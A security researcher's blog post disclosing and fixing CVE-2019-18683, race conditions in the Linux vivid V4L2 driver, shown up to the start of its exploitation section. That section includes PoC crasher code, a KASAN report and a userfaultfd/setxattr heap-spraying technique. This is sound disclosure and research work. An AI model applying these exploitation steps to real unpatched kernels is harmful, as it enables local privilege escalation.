<!DOCTYPE html>
<!-- saved from url=(0058)https://a13xp0p0v.github.io/2020/02/15/CVE-2019-18683.html -->
<html lang="en"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
  <link rel="apple-touch-icon" sizes="180x180" href="https://a13xp0p0v.github.io/img/favicons/apple-touch-icon.png">
  <link rel="icon" type="image/png" sizes="32x32" href="https://a13xp0p0v.github.io/img/favicons/favicon-32x32.png">
  <link rel="icon" type="image/png" sizes="16x16" href="https://a13xp0p0v.github.io/img/favicons/favicon-16x16.png">
  <link rel="manifest" href="https://a13xp0p0v.github.io/img/favicons/site.webmanifest">
  <link rel="shortcut icon" href="https://a13xp0p0v.github.io/img/favicons/favicon.ico">
  <meta name="msapplication-TileColor" content="#da532c">
  <meta name="msapplication-config" content="/img/favicons/browserconfig.xml">
  <meta name="theme-color" content="#ffffff">
  
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1"><!-- Begin Jekyll SEO tag v2.7.1 -->
<title>CVE-2019-18683: Exploiting a Linux kernel vulnerability in the V4L2 subsystem | Alexander Popov</title>
<meta name="generator" content="Jekyll v3.9.0">
<meta property="og:title" content="CVE-2019-18683: Exploiting a Linux kernel vulnerability in the V4L2 subsystem">
<meta property="og:locale" content="en_US">
<meta name="description" content="This article discloses exploitation of CVE-2019-18683, which refers to multiple five-year-old race conditions in the V4L2 subsystem of the Linux kernel. I found and fixed them at the end of 2019. Here I&#39;m going to describe a PoC exploit for x86_64 that gains local privilege escalation from the kernel thread context (where the userspace is not mapped), bypassing KASLR, SMEP, and SMAP on Ubuntu Server 18.04.">
<meta property="og:description" content="This article discloses exploitation of CVE-2019-18683, which refers to multiple five-year-old race conditions in the V4L2 subsystem of the Linux kernel. I found and fixed them at the end of 2019. Here I&#39;m going to describe a PoC exploit for x86_64 that gains local privilege escalation from the kernel thread context (where the userspace is not mapped), bypassing KASLR, SMEP, and SMAP on Ubuntu Server 18.04.">
<link rel="canonical" href="https://a13xp0p0v.github.io/2020/02/15/CVE-2019-18683.html">
<meta property="og:url" content="https://a13xp0p0v.github.io/2020/02/15/CVE-2019-18683.html">
<meta property="og:site_name" content="Alexander Popov">
<meta property="og:image" content="https://a13xp0p0v.github.io/img/ava_bg.jpg">
<meta property="og:type" content="article">
<meta property="article:published_time" content="2020-02-15T10:37:00+00:00">
<meta name="twitter:card" content="summary">
<meta property="twitter:image" content="https://a13xp0p0v.github.io/img/ava_bg.jpg">
<meta property="twitter:title" content="CVE-2019-18683: Exploiting a Linux kernel vulnerability in the V4L2 subsystem">
<meta name="twitter:site" content="@a13xp0p0v">
<script type="application/ld+json">
{"headline":"CVE-2019-18683: Exploiting a Linux kernel vulnerability in the V4L2 subsystem","dateModified":"2020-02-15T10:37:00+00:00","description":"This article discloses exploitation of CVE-2019-18683, which refers to multiple five-year-old race conditions in the V4L2 subsystem of the Linux kernel. I found and fixed them at the end of 2019. Here I&#39;m going to describe a PoC exploit for x86_64 that gains local privilege escalation from the kernel thread context (where the userspace is not mapped), bypassing KASLR, SMEP, and SMAP on Ubuntu Server 18.04.","datePublished":"2020-02-15T10:37:00+00:00","url":"https://a13xp0p0v.github.io/2020/02/15/CVE-2019-18683.html","@type":"BlogPosting","image":"https://a13xp0p0v.github.io/img/ava_bg.jpg","publisher":{"@type":"Organization","logo":{"@type":"ImageObject","url":"https://a13xp0p0v.github.io/img/ava_bg.jpg"}},"mainEntityOfPage":{"@type":"WebPage","@id":"https://a13xp0p0v.github.io/2020/02/15/CVE-2019-18683.html"},"@context":"https://schema.org"}</script>
<!-- End Jekyll SEO tag -->
<link rel="stylesheet" href="./2020 - CVE-2019-18683 Exploiting a Linux kernel vulnerability in the V4L2 subsystem_files/main.css"><link type="application/atom+xml" rel="alternate" href="https://a13xp0p0v.github.io/feed.xml" title="Alexander Popov"></head>
<body><header class="site-header" role="banner">

  <div class="wrapper"><a class="site-title" rel="author" href="https://a13xp0p0v.github.io/"><img id="logo" src="./2020 - CVE-2019-18683 Exploiting a Linux kernel vulnerability in the V4L2 subsystem_files/a13xp0p0v_ava.png" height="60px"> Alexander Popov</a><nav class="site-nav">
        <input type="checkbox" id="nav-trigger" class="nav-trigger">
        <label for="nav-trigger">
          <span class="menu-icon">
            <svg viewBox="0 0 18 15" width="18px" height="15px">
              <path d="M18,1.484c0,0.82-0.665,1.484-1.484,1.484H1.484C0.665,2.969,0,2.304,0,1.484l0,0C0,0.665,0.665,0,1.484,0 h15.032C17.335,0,18,0.665,18,1.484L18,1.484z M18,7.516C18,8.335,17.335,9,16.516,9H1.484C0.665,9,0,8.335,0,7.516l0,0 c0-0.82,0.665-1.484,1.484-1.484h15.032C17.335,6.031,18,6.696,18,7.516L18,7.516z M18,13.516C18,14.335,17.335,15,16.516,15H1.484 C0.665,15,0,14.335,0,13.516l0,0c0-0.82,0.665-1.483,1.484-1.483h15.032C17.335,12.031,18,12.695,18,13.516L18,13.516z"></path>
            </svg>
          </span>
        </label>

        <div class="trigger"><a class="page-link" href="https://a13xp0p0v.github.io/about/">About</a><a class="page-link" href="https://a13xp0p0v.github.io/articles/">Articles</a><a class="page-link" href="https://a13xp0p0v.github.io/conference_talks/">Conference Talks</a></div>
      </nav></div>
</header>
<main class="page-content" aria-label="Content">
      <div class="wrapper">
        <article class="post h-entry" itemscope="" itemtype="http://schema.org/BlogPosting">

  <header class="post-header">
    <h1 class="post-title p-name" itemprop="name headline">CVE-2019-18683: Exploiting a Linux kernel vulnerability in the V4L2 subsystem</h1>
    <p class="post-meta">
      <time class="dt-published" datetime="2020-02-15T10:37:00+00:00" itemprop="datePublished">Feb 15, 2020
      </time></p>
  </header>

  <div class="post-content e-content" itemprop="articleBody">
    <p>This article discloses exploitation of CVE-2019-18683, which refers to multiple five-year-old race conditions in the V4L2 subsystem of the Linux kernel. I found and fixed them at the end of 2019. Here I'm going to describe a PoC exploit for x86_64 that gains local privilege escalation from the kernel thread context (where the userspace is not mapped), bypassing KASLR, SMEP, and SMAP on Ubuntu Server 18.04.</p>

<p>Today I gave <a href="https://www.offensivecon.org/speakers/2020/alexander-popov.html">a talk at OffensiveCon 2020</a> about it (<a href="https://a13xp0p0v.github.io/img/CVE-2019-18683.pdf">slides</a>). First of all let's watch the <a href="https://youtu.be/mb4YHyLy0Zc">demo video</a>.</p>
<div style="position:relative;padding-top:56.25%;">
  <iframe src="./2020 - CVE-2019-18683 Exploiting a Linux kernel vulnerability in the V4L2 subsystem_files/mb4YHyLy0Zc.html" frameborder="0" allowfullscreen="" style="position:absolute;top:0;left:0;width:100%;height:100%;"></iframe>
</div>
<p><br></p>

<h2 id="vulnerabilities">Vulnerabilities</h2>

<p>These vulnerabilities are caused by incorrect mutex locking in the <code class="language-plaintext highlighter-rouge">vivid</code> driver of the <code class="language-plaintext highlighter-rouge">V4L2</code> subsystem (<a href="https://elixir.bootlin.com/linux/v5.4/source/drivers/media/platform/vivid"><code class="language-plaintext highlighter-rouge">drivers/media/platform/vivid</code></a>). This driver doesn't require any special hardware. It is shipped in Ubuntu, Debian, Arch Linux, SUSE Linux Enterprise, and openSUSE as a kernel module (<code class="language-plaintext highlighter-rouge">CONFIG_VIDEO_VIVID=m</code>).</p>

<p>The <code class="language-plaintext highlighter-rouge">vivid</code> driver emulates <code class="language-plaintext highlighter-rouge">video4linux</code> hardware of various types: video capture, video output, radio receivers and transmitters and a software defined radio receivers. These inputs and outputs act exactly as a real hardware device would behave. That allows to use this driver as a test input for application development without requiring special hardware. <a href="https://www.kernel.org/doc/html/latest/media/v4l-drivers/vivid.html">Kernel documentation</a> describes how to use the devices created by the <code class="language-plaintext highlighter-rouge">vivid</code> driver.</p>

<p>On Ubuntu, the devices created by the <code class="language-plaintext highlighter-rouge">vivid</code> driver are available to normal users since Ubuntu applies the RW ACL when the user is logged in:</p>

<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  a13x@ubuntu_server_1804:~<span class="nv">$ </span>getfacl /dev/video0
  getfacl: Removing leading <span class="s1">'/'</span> from absolute path names
  <span class="c"># file: dev/video0</span>
  <span class="c"># owner: root</span>
  <span class="c"># group: video</span>
  user::rw-
  user:a13x:rw-
  group::rw-
  mask::rw-
  other::---
</code></pre></div></div>

<p>(Un)fortunately, I don't know how to autoload the vulnerable driver, which limits the severity of these vulnerabilities. That's why the Linux kernel security team has allowed me to do <a href="https://www.openwall.com/lists/oss-security/2019/11/02/1">full disclosure</a>.</p>

<h2 id="bugs-and-fixes">Bugs and fixes</h2>

<p>I used the <a href="https://github.com/google/syzkaller/">syzkaller fuzzer</a> with custom modifications to the kernel source code and got a suspicious kernel crash. KASAN detected use-after-free during linked list manipulations in <code class="language-plaintext highlighter-rouge">vid_cap_buf_queue()</code>. Investigation of the reasons led me quite far from the memory corruption. Ultimately, I found that <strong>the same incorrect approach</strong> to locking is used in <code class="language-plaintext highlighter-rouge">vivid_stop_generating_vid_cap()</code>, <code class="language-plaintext highlighter-rouge">vivid_stop_generating_vid_out()</code>, and <code class="language-plaintext highlighter-rouge">sdr_cap_stop_streaming()</code>. This resulted in three similar vulnerabilities.</p>

<p>These functions are called with <code class="language-plaintext highlighter-rouge">vivid_dev.mutex</code> locked when streaming is being stopped. The functions all make the same mistake when stopping their kthreads that need to lock this mutex as well. See the example from <code class="language-plaintext highlighter-rouge">vivid_stop_generating_vid_cap()</code>:</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code>	<span class="cm">/* shutdown control thread */</span>
	<span class="n">vivid_grab_controls</span><span class="p">(</span><span class="n">dev</span><span class="p">,</span> <span class="nb">false</span><span class="p">);</span>
	<span class="n">mutex_unlock</span><span class="p">(</span><span class="o">&amp;</span><span class="n">dev</span><span class="o">-&gt;</span><span class="n">mutex</span><span class="p">);</span>
	<span class="n">kthread_stop</span><span class="p">(</span><span class="n">dev</span><span class="o">-&gt;</span><span class="n">kthread_vid_cap</span><span class="p">);</span>
	<span class="n">dev</span><span class="o">-&gt;</span><span class="n">kthread_vid_cap</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
	<span class="n">mutex_lock</span><span class="p">(</span><span class="o">&amp;</span><span class="n">dev</span><span class="o">-&gt;</span><span class="n">mutex</span><span class="p">);</span>
</code></pre></div></div>

<p>But when this mutex is unlocked, another <code class="language-plaintext highlighter-rouge">vb2_fop_read()</code> can lock it instead of the kthread and manipulate the buffer queue. That creates an opportunity for use-after-free later when streaming is started again.</p>

<p>To fix these issues, I did the following:</p>
<ol>
  <li>Avoided unlocking the mutex on streaming stop. For example, see the diff for <code class="language-plaintext highlighter-rouge">vivid_stop_generating_vid_cap()</code>: <br>
    <div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code>	<span class="cm">/* shutdown control thread */</span>
	<span class="n">vivid_grab_controls</span><span class="p">(</span><span class="n">dev</span><span class="p">,</span> <span class="nb">false</span><span class="p">);</span>
  <span class="o">-</span>	<span class="n">mutex_unlock</span><span class="p">(</span><span class="o">&amp;</span><span class="n">dev</span><span class="o">-&gt;</span><span class="n">mutex</span><span class="p">);</span>
	<span class="n">kthread_stop</span><span class="p">(</span><span class="n">dev</span><span class="o">-&gt;</span><span class="n">kthread_vid_cap</span><span class="p">);</span>
	<span class="n">dev</span><span class="o">-&gt;</span><span class="n">kthread_vid_cap</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
  <span class="o">-</span>	<span class="n">mutex_lock</span><span class="p">(</span><span class="o">&amp;</span><span class="n">dev</span><span class="o">-&gt;</span><span class="n">mutex</span><span class="p">);</span>
</code></pre></div>    </div>
  </li>
  <li>Used <code class="language-plaintext highlighter-rouge">mutex_trylock()</code> with <code class="language-plaintext highlighter-rouge">schedule_timeout_uninterruptible()</code> in the loops of the vivid kthread handlers. The <code class="language-plaintext highlighter-rouge">vivid_thread_vid_cap()</code> handler was changed as follows: <br>
    <div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  	<span class="k">for</span> <span class="p">(;;)</span> <span class="p">{</span>
  		<span class="n">try_to_freeze</span><span class="p">();</span>
  		<span class="k">if</span> <span class="p">(</span><span class="n">kthread_should_stop</span><span class="p">())</span>
  			<span class="k">break</span><span class="p">;</span>
  <span class="o">-</span>		<span class="n">mutex_lock</span><span class="p">(</span><span class="o">&amp;</span><span class="n">dev</span><span class="o">-&gt;</span><span class="n">mutex</span><span class="p">);</span>
  <span class="o">+</span>		<span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">mutex_trylock</span><span class="p">(</span><span class="o">&amp;</span><span class="n">dev</span><span class="o">-&gt;</span><span class="n">mutex</span><span class="p">))</span> <span class="p">{</span>
  <span class="o">+</span>			<span class="n">schedule_timeout_uninterruptible</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
  <span class="o">+</span>			<span class="k">continue</span><span class="p">;</span>
  <span class="o">+</span>		<span class="p">}</span>
  		<span class="p">...</span>
  	<span class="p">}</span>
</code></pre></div>    </div>
  </li>
</ol>

<p>If mutex is not available, the kthread will sleep one jiffy and then try again. If that happens on streaming stop, in the worst case the kthread will go to sleep several times and then hit <code class="language-plaintext highlighter-rouge">break</code> on another loop iteration. So, in a certain sense, stopping <code class="language-plaintext highlighter-rouge">vivid</code> kthread handlers was made lockless.</p>

<h2 id="sleeping-is-hard">Sleeping is hard</h2>

<p>I did responsible disclosure just after I finished my PoC exploit (I was at the Linux Security Summit in Lyon at the time). I sent the description of the vulnerabilities, fixing patch, and PoC crasher to <code class="language-plaintext highlighter-rouge">security@kernel.org</code>.</p>

<p>Linus Torvalds replied in less than two hours (great!). My communication with him was excellent this time. However, it took us four versions of the patch to do the right thing just because sleeping in kernel is not so easy.</p>

<p>The kthread in the first version of my patch didn't sleep at all:</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code>	<span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">mutex_trylock</span><span class="p">(</span><span class="o">&amp;</span><span class="n">dev</span><span class="o">-&gt;</span><span class="n">mutex</span><span class="p">))</span>
		<span class="k">continue</span><span class="p">;</span>
</code></pre></div></div>

<p>That solved the vulnerability but – as Linus noticed – also introduced a busy-loop that can cause a deadlock on a non-preemptible kernel. I tested the PoC crasher that I sent them on the kernel with <code class="language-plaintext highlighter-rouge">CONFIG_PREEMPT_NONE=y</code>. It managed to cause a deadlock after some time, just like Linus had said.</p>

<p>So I returned with a second version of the patch, in which the kthread does the following:</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code>	<span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">mutex_trylock</span><span class="p">(</span><span class="o">&amp;</span><span class="n">dev</span><span class="o">-&gt;</span><span class="n">mutex</span><span class="p">))</span> <span class="p">{</span>
		<span class="n">schedule_timeout_interruptible</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
		<span class="k">continue</span><span class="p">;</span>
	<span class="p">}</span>
</code></pre></div></div>

<p>I used <code class="language-plaintext highlighter-rouge">schedule_timeout_interruptible()</code> because it is used in other parts of <code class="language-plaintext highlighter-rouge">vivid-kthread-cap.c</code>. The maintainers asked to use <code class="language-plaintext highlighter-rouge">schedule_timeout()</code> for cleaner code because kernel threads shouldn't normally take signals. I changed it, tested the patch, and sent the third version.</p>

<p>But finally after my full disclosure, Linus <a href="https://lore.kernel.org/lkml/CAHk-=wgE-veRb7+mw9oMmsD97BLnL+q8Gxu0QRrK65S2yQfMdQ@mail.gmail.com/">discovered</a> that we were wrong yet again:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>I just realized that this too is wrong. It _works_, but because it
doesn't actually set the task state to anything particular before
scheduling, it's basically pointless. It calls the scheduler, but it
won't delay anything, because the task stays runnable.

So what you presumably want to use is either "cond_resched()" (to make
sure others get to run with no delay) or
"schedule_timeout_uninterruptible(1)" which actually sets the process
state to TASK_UNINTERRUPTIBLE.

The above works, but it's basically nonsensical.
</code></pre></div></div>

<p>So it was incorrect kernel API usage that worked fine by pure luck. I fixed that in the final version of the patch.</p>

<p>Later I <a href="https://lore.kernel.org/lkml/20200116140218.1328022-1-alex.popov@linux.com/T/#u">prepared</a> a patch for the mainline that adds a warning for detecting such API misuse. But Steven Rostedt <a href="https://lore.kernel.org/lkml/20200116095220.7368a604@gandalf.local.home/">described</a> that this is a known and intended side effect. So I came back with <a href="https://lore.kernel.org/lkml/20200117225900.16340-1-alex.popov@linux.com/T/#u">another patch</a> that improves the <code class="language-plaintext highlighter-rouge">schedule_timeout()</code> annotation and describes its behavior more explicitly. That patch is scheduled for the mainline.</p>

<p>It turned out that sleeping is not so easy sometimes :)</p>

<p>Now let's talk about exploitation.</p>

<h2 id="winning-the-race">Winning the race</h2>

<p>As described earlier, <code class="language-plaintext highlighter-rouge">vivid_stop_generating_vid_cap()</code> is called upon streaming stop. It unlocks the device mutex in the hope that <code class="language-plaintext highlighter-rouge">vivid_thread_vid_cap()</code> running in the kthread will lock it and exit the loop. Achieving memory corruption requires winning the race against this kthread.</p>

<p>Please see the code of the <a href="https://a13xp0p0v.github.io/img/v4l2-crasher.c">PoC crasher</a>. If you want to test it on a vulnerable kernel, ensure that:</p>
<ul>
  <li>The <code class="language-plaintext highlighter-rouge">vivid</code> driver is loaded.</li>
  <li><code class="language-plaintext highlighter-rouge">/dev/video0</code> is the <code class="language-plaintext highlighter-rouge">V4L2</code> capture device (see the kernel logs).</li>
  <li>You are logged in (Ubuntu applies the RW ACL that I mentioned already).</li>
</ul>

<p>It creates two pthreads. They are bound to separate CPUs using <code class="language-plaintext highlighter-rouge">sched_setaffinity</code> for better racing:</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code>	<span class="n">cpu_set_t</span> <span class="n">single_cpu</span><span class="p">;</span>

	<span class="n">CPU_ZERO</span><span class="p">(</span><span class="o">&amp;</span><span class="n">single_cpu</span><span class="p">);</span>
	<span class="n">CPU_SET</span><span class="p">(</span><span class="n">cpu_n</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">single_cpu</span><span class="p">);</span>
	<span class="n">ret</span> <span class="o">=</span> <span class="n">sched_setaffinity</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">single_cpu</span><span class="p">),</span> <span class="o">&amp;</span><span class="n">single_cpu</span><span class="p">);</span>
	<span class="k">if</span> <span class="p">(</span><span class="n">ret</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">)</span>
		<span class="n">err_exit</span><span class="p">(</span><span class="s">"[-] sched_setaffinity for a single CPU"</span><span class="p">);</span>
</code></pre></div></div>

<p>Here is the main part where the racing happens:</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code>	<span class="k">for</span> <span class="p">(</span><span class="n">loop</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">loop</span> <span class="o">&lt;</span> <span class="n">LOOP_N</span><span class="p">;</span> <span class="n">loop</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
		<span class="kt">int</span> <span class="n">fd</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>

		<span class="n">fd</span> <span class="o">=</span> <span class="n">open</span><span class="p">(</span><span class="s">"/dev/video0"</span><span class="p">,</span> <span class="n">O_RDWR</span><span class="p">);</span>
		<span class="k">if</span> <span class="p">(</span><span class="n">fd</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span>
			<span class="n">err_exit</span><span class="p">(</span><span class="s">"[-] open /dev/video0"</span><span class="p">);</span>

		<span class="n">read</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="n">buf</span><span class="p">,</span> <span class="mh">0xfffded</span><span class="p">);</span>
		<span class="n">close</span><span class="p">(</span><span class="n">fd</span><span class="p">);</span>
	<span class="p">}</span>
</code></pre></div></div>

<p><code class="language-plaintext highlighter-rouge">vid_cap_start_streaming()</code>, which starts streaming, is called by <code class="language-plaintext highlighter-rouge">V4L2</code> during <code class="language-plaintext highlighter-rouge">vb2_core_streamon()</code> on first reading from the opened file descriptor.</p>

<p><code class="language-plaintext highlighter-rouge">vivid_stop_generating_vid_cap()</code>, which stops streaming, is called by <code class="language-plaintext highlighter-rouge">V4L2</code> during <code class="language-plaintext highlighter-rouge">__vb2_queue_cancel()</code> on release of the last reference to the file.</p>

<p>If another reading "wins" the race against the kthread, it calls <code class="language-plaintext highlighter-rouge">vb2_core_qbuf()</code>, which adds an unexpected <code class="language-plaintext highlighter-rouge">vb2_buffer</code> to <code class="language-plaintext highlighter-rouge">vb2_queue.queued_list</code>.
This is how memory corruption begins.</p>

<h2 id="deceived-v4l2-subsystem">Deceived V4L2 subsystem</h2>

<p>Meanwhile, streaming has fully stopped. The last reference to <code class="language-plaintext highlighter-rouge">/dev/video0</code> is released and the <code class="language-plaintext highlighter-rouge">V4L2</code> subsystem calls <code class="language-plaintext highlighter-rouge">vb2_core_queue_release()</code>, which is responsible for freeing up resources. It in turn calls <code class="language-plaintext highlighter-rouge">__vb2_queue_free()</code>, which frees our <code class="language-plaintext highlighter-rouge">vb2_buffer</code> that was added to the queue when the exploit won the race.</p>

<p>But the driver is not aware of this and still holds the reference to the freed object. When streaming is started again on the next exploit loop, <code class="language-plaintext highlighter-rouge">vivid</code> driver touches the freed object that is caught by KASAN:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code> ==================================================================
 BUG: KASAN: use-after-free in vid_cap_buf_queue+0x188/0x1c0
 Write of size 8 at addr ffff8880798223a0 by task v4l2-crasher/300
 
 CPU: 1 PID: 300 Comm: v4l2-crasher Tainted: G        W         5.4.0-rc2+ #3
 Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS ?-20190727_073836-buildvm-ppc64le-16.ppc.fedoraproject.org-3.fc31 04/01/2014
 Call Trace:
  dump_stack+0x5b/0x90
  print_address_description.constprop.0+0x16/0x200
  ? vid_cap_buf_queue+0x188/0x1c0
  ? vid_cap_buf_queue+0x188/0x1c0
  __kasan_report.cold+0x1a/0x41
  ? vid_cap_buf_queue+0x188/0x1c0
  kasan_report+0xe/0x20
  vid_cap_buf_queue+0x188/0x1c0
  vb2_start_streaming+0x222/0x460
  vb2_core_streamon+0x111/0x240
  __vb2_init_fileio+0x816/0xa30
  __vb2_perform_fileio+0xa88/0x1120
  ? kmsg_dump_rewind_nolock+0xd4/0xd4
  ? vb2_thread_start+0x300/0x300
  ? __mutex_lock_interruptible_slowpath+0x10/0x10
  vb2_fop_read+0x249/0x3e0
  v4l2_read+0x1bf/0x240
  vfs_read+0xf6/0x2d0
  ksys_read+0xe8/0x1c0
  ? kernel_write+0x120/0x120
  ? __ia32_sys_nanosleep_time32+0x1c0/0x1c0
  ? do_user_addr_fault+0x433/0x8d0
  do_syscall_64+0x89/0x2e0
  ? prepare_exit_to_usermode+0xec/0x190
  entry_SYSCALL_64_after_hwframe+0x44/0xa9
 RIP: 0033:0x7f3a8ec8222d
 Code: c1 20 00 00 75 10 b8 00 00 00 00 0f 05 48 3d 01 f0 ff ff 73 31 c3 48 83 ec 08 e8 4e fc ff ff 48 89 04 24 b8 00 00 00 00 0f 05 &lt;48&gt; 8b 3c 24 48 89 c2 e8 97 fc ff ff 48 89 d0 48 83 c4 08 48 3d 01
 RSP: 002b:00007f3a8d0d0e80 EFLAGS: 00000293 ORIG_RAX: 0000000000000000
 RAX: ffffffffffffffda RBX: 0000000000000000 RCX: 00007f3a8ec8222d
 RDX: 0000000000fffded RSI: 00007f3a8d8d3000 RDI: 0000000000000003
 RBP: 00007f3a8d0d0f50 R08: 0000000000000001 R09: 0000000000000026
 R10: 000000000000060e R11: 0000000000000293 R12: 00007ffc8d26495e
 R13: 00007ffc8d26495f R14: 00007f3a8c8d1000 R15: 0000000000000003
 
 Allocated by task 299:
  save_stack+0x1b/0x80
  __kasan_kmalloc.constprop.0+0xc2/0xd0
  __vb2_queue_alloc+0xd9/0xf20
  vb2_core_reqbufs+0x569/0xb10
  __vb2_init_fileio+0x359/0xa30
  __vb2_perform_fileio+0xa88/0x1120
  vb2_fop_read+0x249/0x3e0
  v4l2_read+0x1bf/0x240
  vfs_read+0xf6/0x2d0
  ksys_read+0xe8/0x1c0
  do_syscall_64+0x89/0x2e0
  entry_SYSCALL_64_after_hwframe+0x44/0xa9
 
 Freed by task 300:
  save_stack+0x1b/0x80
  __kasan_slab_free+0x12c/0x170
  kfree+0x90/0x240
  __vb2_queue_free+0x686/0x7b0
  vb2_core_reqbufs.cold+0x1d/0x8a
  __vb2_cleanup_fileio+0xe9/0x140
  vb2_core_queue_release+0x12/0x70
  _vb2_fop_release+0x20d/0x290
  v4l2_release+0x295/0x330
  __fput+0x245/0x780
  task_work_run+0x126/0x1b0
  exit_to_usermode_loop+0x102/0x120
  do_syscall_64+0x234/0x2e0
  entry_SYSCALL_64_after_hwframe+0x44/0xa9
 
 The buggy address belongs to the object at ffff888079822000
  which belongs to the cache kmalloc-1k of size 1024
 The buggy address is located 928 bytes inside of
  1024-byte region [ffff888079822000, ffff888079822400)
 The buggy address belongs to the page:
 page:ffffea0001e60800 refcount:1 mapcount:0 mapping:ffff88802dc03180 index:0xffff888079827800 compound_mapcount: 0
 flags: 0x500000000010200(slab|head)
 raw: 0500000000010200 ffffea0001e77c00 0000000200000002 ffff88802dc03180
 raw: ffff888079827800 000000008010000c 00000001ffffffff 0000000000000000
 page dumped because: kasan: bad access detected
 
 Memory state around the buggy address:
  ffff888079822280: fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb
  ffff888079822300: fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb
 &gt;ffff888079822380: fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb
                                ^
  ffff888079822400: fc fc fc fc fc fc fc fc fc fc fc fc fc fc fc fc
  ffff888079822480: fc fc fc fc fc fc fc fc fc fc fc fc fc fc fc fc
 ==================================================================
</code></pre></div></div>

<p>As you can see from this report, use-after-free happens on the object from the <code class="language-plaintext highlighter-rouge">kmalloc-1k</code> cache. That object is relatively big, so its slab cache is not so heavily used in the kernel. That makes heap spraying more precise (good for exploitation).</p>

<h2 id="heap-spraying">Heap spraying</h2>

<p>Heap spraying is an exploitation technique that aims to put controlled bytes at a predetermined memory location on the heap. Heap spraying usually involves allocating multiple heap objects with controlled contents and abusing some allocator behavior pattern.</p>

<p>Heap spraying for exploiting use-after-free in the Linux kernel relies on the fact that on <code class="language-plaintext highlighter-rouge">kmalloc()</code>, the slab allocator returns the address to the memory that was recently freed (for better performance). Allocating a kernel object with the same size and controlled contents allows overwriting the vulnerable freed object:</p>

<p><img src="./2020 - CVE-2019-18683 Exploiting a Linux kernel vulnerability in the V4L2 subsystem_files/uaf.png" alt="use-after-free exploiting"></p>

<p>There is <a href="https://duasynt.com/blog/linux-kernel-heap-spray">an excellent post</a> by Vitaly Nikolenko, in which he shares a very powerful technique that uses <code class="language-plaintext highlighter-rouge">userfaultfd()</code> and <code class="language-plaintext highlighter-rouge">setxattr()</code> for exploiting use-after-free in the Linux kernel. I highly recommend reading that article before proceeding with my write-up. The main idea is that <code class="language-plaintext highlighter-rouge">userfaultfd()</code> gives you control over the lifetime of data that is allocated by <code class="language-plaintext highlighter-rouge">setxattr()</code> in the kernelspace. I used that trick in various forms for exploiting this vulnerability.</p>

<p>As I described earlier, the <code class="language-plaintext highlighter-rouge">vb2_buffer</code> is freed on streaming stop and is used later, on the next streaming start. That is very convenient – my heap spray can simply go at the end of the racing loop iteration! But there is one catch: the vulnerable <code class="language-plaintext highlighter-rouge">vb2_buffer</code> is <strong>not</strong> the last one freed by <code class="language-plaintext highlighter-rouge">__vb2_queue_free()</code>. In other words, the next <code class="language-plaintext highlighter-rouge">kmalloc()</code> doesn't return the needed pointer. That's why having only one allocation is not enough for overwriting the vulnerable object, making it important to really "spray".</p>

<p>That is not so easy with Vitaly's technique: the spraying process with <code class="language-plaintext highlighter-rouge">setxattr()</code> <strong>hangs</strong> until the <code class="language-plaintext highlighter-rouge">userfaultfd()</code> page fault handler calls the <code class="language-plaintext highlighter-rouge">UFFDIO_COPY</code> ioctl. If we want the <code class="language-plaintext highlighter-rouge">setxattr()</code> allocations to be persistent, we should never call this ioctl. I bypassed that restriction by creating a pool of pthreads: each spraying pthread calls <code class="language-plaintext highlighter-rouge">setxattr()</code> powered by <code class="language-plaintext highlighter-rouge">userfaultfd()</code> and hangs. I also distribute spraying pthreads among different CPUs using <code class="language-plaintext highlighter-rouge">sched_setaffinity()</code> to make allocations in all slab caches (they are per-CPU).</p>

<p>And now let's continue with describing the payload that I created for overwriting the vulnerable <code class="language-plaintext highlighter-rouge">vb2_buffer</code>.
I'm going to tell you about the development of the payload in chronological order.</p>

<h2 id="control-flow-hijack-for-v4l2-subsystem">Control flow hijack for V4L2 subsystem</h2>

<p><code class="language-plaintext highlighter-rouge">V4L2</code> is a very complex Linux kernel subsystem. The following diagram (not to scale) describes the relationships between the objects that are part of the subsystem:</p>

<p><br>
<img src="./2020 - CVE-2019-18683 Exploiting a Linux kernel vulnerability in the V4L2 subsystem_files/v4l2_objects.png" width="5700px">
<br>
<br></p>

<p>After my heap spray started to work fine, I spent a lot of (painful) time searching for a good exploit primitive that I could get with a <code class="language-plaintext highlighter-rouge">vb2_buffer</code> under my control. Unfortunately, I didn't manage to create an arbitrary write by crafting <code class="language-plaintext highlighter-rouge">vb2_buffer.planes</code>. Later I found a promising function pointer: <code class="language-plaintext highlighter-rouge">vb2_buffer.vb2_queue-&gt;mem_ops-&gt;vaddr</code>. Its prototype is pure luxury, I'd say!</p>

